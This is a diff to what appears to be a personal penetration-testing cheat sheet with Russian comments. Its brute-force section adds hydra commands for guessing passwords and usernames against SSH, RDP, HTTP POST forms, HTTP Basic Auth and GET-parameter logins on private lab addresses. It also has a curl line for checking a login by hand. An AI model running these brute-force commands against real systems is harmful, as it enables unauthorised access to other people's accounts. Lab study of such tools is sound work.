@@ -153,13 +153,16 @@ systemctl list-timers
 
 
 ==========BROUTEFORCE
-wodlists	install on kali by apt
 hydra -l username -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
-	перебор паролей для пользователя username
+	перебор паролей для пользователя username, порт 2222
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
 	перебор имен для известного пароля
-hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"
 	перебор паролей для user по запросу из burp
+hydra -l admin -P passes.txt 192.168.1.1 http-get /admin
+	HTTP Basic Auth (в браузере выскакивает окошко логина): GET /admin HTTP/1.1 \nAuthorization: Basic YWRtaW46cGFzcw==
+hydra -L users.txt -P passes.txt 192.168.1.1 http-get-form "/path:param1=^USER^&param2=^PASS^:Error_string"
+	GET параметры в URL (логин через URL типа ?user=admin&pass=123): GET /login?user=admin&pass=123
 curl -X POST http://192.168.192.201/index.php -d "fm_usr=user&fm_pwd=test"
 	проверить вручную
 medusa
